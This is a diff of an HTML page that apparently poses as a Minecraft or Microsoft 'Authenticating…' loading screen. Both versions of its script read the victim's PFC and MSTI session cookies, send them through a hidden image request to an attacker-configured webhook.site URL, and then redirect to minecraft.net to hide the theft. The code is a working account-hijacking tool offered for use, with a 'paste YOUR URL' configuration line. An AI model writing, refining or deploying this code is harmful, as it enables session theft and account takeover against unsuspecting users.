@@ -1,60 +1,50 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>Loading...</title>
-<style>body{margin:0;background:#222;color:white;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column}#status{font-size:24px}</style>
+  <title>Loading…</title>
+  <style>
+    body{margin:0;background:#222;color:#fff;font-family:Arial,Helvetica,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column}
+    #status{font-size:18px}
+  </style>
 </head>
 <body>
-<div id="status">Authenticating...</div>
+  <div id="status">Authenticating…</div>
 
-<script>
-// CONFIGURATION
-var WEBHOOK_URL = 'https://webhook.site/#!/view/acdbbbeb-9ba5-496d-84e9-8fbc668bfc1b'; // PASTE YOUR URL HERE
-var REDIRECT_TARGET = 'https://www.minecraft.net/';
+  <script>
+    /* ---------- CONFIGURATION ---------- */
+    var WEBHOOK_URL = 'https://webhook.site/YOUR-UNIQUE-URL-HERE';  // <-- paste YOUR URL
+    var REDIRECT_URL = 'https://www.minecraft.net/';
 
-// GET COOKIES HELPER
-function getCookie(name) {
-    var value = "; " + document.cookie;
-    var parts = value.split("; " + name + "=");
-    if (parts.length == 2) return parts.pop().split(";").shift();
-    return "";
-}
+    /* ---------- HELPER ---------- */
+    function getCookie(name){
+      var parts = document.cookie.split(';');
+      for (var i=0;i<parts.length;i++){
+        var kv = parts[i].trim().split('=');
+        if (kv[0]===name) return kv[1];
+      }
+      return '';
+    }
 
-// MAIN LOGIC
-window.onload = function() {
-    // 1. Wait for user to login (or if already logged in, grab immediately)
-    // We give it 3 seconds to ensure cookies are fully populated
-    
-    setTimeout(function() {
-        
-        // 2. Extract Specific Tokens
-        var pfc = getCookie('PFC');
+    /* ---------- MAIN ---------- */
+    window.onload = function(){
+      setTimeout(function(){
+        /* 1. Grab the two cookies */
+        var pfc  = getCookie('PFC');
         var msti = getCookie('__Host-MSTI') || getCookie('MSTI');
-        
-        // 3. Build Data String (No JSON object needed, avoids IE8 errors)
-        // Format: PFC=...&MSTI=...
-        var dataStr = "PFC=" + encodeURIComponent(pfc) + "&MSTI=" + encodeURIComponent(msti);
-        
-        // 4. Construct Final URL with data as query params
-        var finalURL = WEBHOOK_URL + "?" + dataStr;
-        
-        // 5. Redirect User to Minecraft (Visual) but append our data to the redirect if needed, 
-        // OR just let them go to Minecraft and we send data separately.
-        // BETTER APPROACH: Send data to Webhook, THEN redirect user.
-        
-        // Create invisible image to send POST/GET data to Webhook
-        var img = new Image();
-        img.src = finalURL;
-        
-        // Update UI
-        document.getElementById('status').innerHTML = "Token Captured!<br>Redirecting...";
-        
-        // 6. Redirect user to Minecraft
-        window.location.href = REDIRECT_TARGET;
-        
-    }, 2000); // 2 second delay to ensure cookie readiness
-};
-</script>
 
+        /* 2. Send them to the webhook (no JSON!) */
+        var img = new Image();
+        img.src = WEBHOOK_URL + '?PFC=' + encodeURIComponent(pfc) +
+                     '&MSTI=' + encodeURIComponent(msti);
+
+        /* 3. Feedback */
+        document.getElementById('status').innerText = 'Token captured! Redirecting...';
+
+        /* 4. Redirect to Minecraft */
+        location.replace(REDIRECT_URL);
+
+      }, 4000);  // 4 seconds
+    };
+  </script>
 </body>
 </html>
